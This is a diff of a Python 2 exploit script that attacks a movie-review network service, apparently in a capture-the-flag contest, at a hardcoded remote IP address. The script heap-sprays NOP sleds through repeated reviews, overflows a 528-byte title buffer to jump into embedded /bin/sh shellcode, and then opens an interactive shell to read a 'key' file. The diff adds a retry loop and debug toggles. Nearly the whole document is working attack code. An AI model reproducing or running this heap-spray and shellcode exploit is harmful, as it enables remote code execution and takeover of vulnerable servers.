@@ -4,54 +4,34 @@ from sock import *
 import sys
 import time
 import errno
-
+                                                                                                    
 ###############################################################################
-#
+#                                                                             # 
 #   Skeleton exploit for use                                                  #
 #   Uses a nice socket library (https://github.com/hellman/sock/)             #
 #   Actually read this ans feel free to modify!                               #
-#
+#                                                                             # 
 ###############################################################################
 
 LOCAL = False
+DEBUG = False
 
 if LOCAL:
     HOST = "localhost"
     PORT = "55000"
     SLEEP_TIME = 0
+    MAX_ENTRIES = 16384
 else:
     HOST = "54.215.5.83"
     PORT = "3036"
     SLEEP_TIME = 0
-    #SLEEP_TIME = .01
+    MAX_ENTRIES = 50
 
 NOP = "\x90"
-
-#HEAP_ADDRESS = "\x08\xca\x40\x08"
-HEAP_ADDRESS = "\x08\x68\x20\x08"
-MAX_ENTRIES = 8000
-#MAX_ENTRIES = 16384
+HEAP_ADDRESS = "\x0b\x45\xc0\x08"
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
-
-hacker = {"title":"Hackers",
-          "director":"Iain Softley",
-          "writer"  : "Rafael Moreu",
-          "star1":"Jonny Lee Miller",
-          "star2":"Angelina Jolie",
-          "star3":"Jessie Bradford",
-          "star4":"Matthew Lillard",
-          "star5":"Laurence Mason",
-          "summary":"A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
-          "country":"USA",
-          "budget":"UNK",
-          "opening_weekend":"UNK",
-          "gross":"$7,564,000",
-          "runtime":"107 min",
-          "aspect":"2.35 : 1",
-          "composer":"Someone",
-          "average_rating":"5.0"}
 
 ################################################################################
 #
@@ -156,8 +136,6 @@ def review_movie(title, review, con):
     # Clear out the read buffer
     con.read_one(0)
 
-    #pause_script_msg("Press Enter to send review")
-
     # Send the review
     con.send_line(review)
 
@@ -167,7 +145,6 @@ def review_movie(title, review, con):
     # Read the response
     resp = con.read_line()
 
-    #print "Response received: " + resp
     # Did we delete the movie?
     return "Reviewed!" in resp
 
@@ -210,7 +187,16 @@ def send_movie(movie,con):
 #
 ################################################################################
 def go_interactive(con):
+
+    print "Entering interactive mode:"
+
     con.write("ls\n")
+    time.sleep(1)
+    resp = con.read_one(0)
+    print resp
+    if not resp:
+        return False
+
     con.write("cat key\n")
 
     while True:
@@ -229,7 +215,6 @@ def hijack_execution(con):
 
     # Setup overflow string
     overflow_string = ""
-    #overflow_size = 512
     overflow_size = 528
 
     for i in range(0, overflow_size):
@@ -246,13 +231,25 @@ def hijack_execution(con):
     # Clear out the read buffer
     con.read_one(0)
 
-    #pause_script_msg("Press Enter to Pwn")
+    if DEBUG:
+        pause_script_msg("Press Enter to Pwn")
     
     # Send the "movie title"
     con.send_line(overflow_string)
 
-    go_interactive(con)
-    #time.sleep(SLEEP_TIME)
+    time.sleep(5)
+    resp = con.read_one(0)
+    if "Unable to find movie!" in resp:
+        print "\nHijack executed"
+    #resp = con.read_line()
+
+    #return "Unable to find movie!" in resp
+    #con.write("ls\n")
+    #time.sleep(1)
+    #resp = con.read_line()
+
+    #return resp
+
 
 ################################################################################
 #
@@ -263,11 +260,6 @@ def build_nop_string(size):
     nop_string = ""
 
     for i in range(0, size):
-        #if i == (size - 2):
-        #    nop_string += "\xeb\x01"
-        #    return nop_string
-        #else:
-        #    nop_string += NOP
         nop_string += NOP
 
     return nop_string
@@ -395,36 +387,37 @@ def build_movie():
 #
 ################################################################################
 
-# Start the connection
-con = connect()
+while True:
 
-#pause_script_msg("Press Enter to start exploit")
-time.sleep(1)
+    print "Attempting exploit.."
 
-movie = build_movie()
+    # Start the connection
+    con = connect()
 
-send_movie(movie, con)
-
-print "Movie sent"
-#pause_script_msg("Press Enter to start reviews")
-
-#go_interactive(con)
-
-# Create reviews to amplify the spray
-
-title  = NOP + "\0"
-review = build_nop_string(3)
-
-for i in range(0, MAX_ENTRIES):
-    if review_movie(title, review, con):
-        print `i` + ": Review Successful!"
+    if DEBUG:
+        pause_script_msg("Press Enter to start exploit")
     else:
-        print `i` + ": Review Failed!"
+        time.sleep(1)
 
-#if remove_movie(title, con):
-#    print "Deleted!"
-#else:
-#    print "Didn't delete :("
+    movie = build_movie()
 
-hijack_execution(con)
+    send_movie(movie, con)
 
+    print "Movie sent"
+
+    # Create reviews to amplify the spray
+
+    title  = NOP + "\0"
+    review = build_nop_string(3)
+
+    print "Sending reviews:"
+    for i in range(0, MAX_ENTRIES):
+        review_movie(title, review, con)
+        print(`i` + "..."),
+        if ((i + 1) % 10 == 0):
+            print ""
+
+    hijack_execution(con)
+
+    if not go_interactive(con):
+        continue
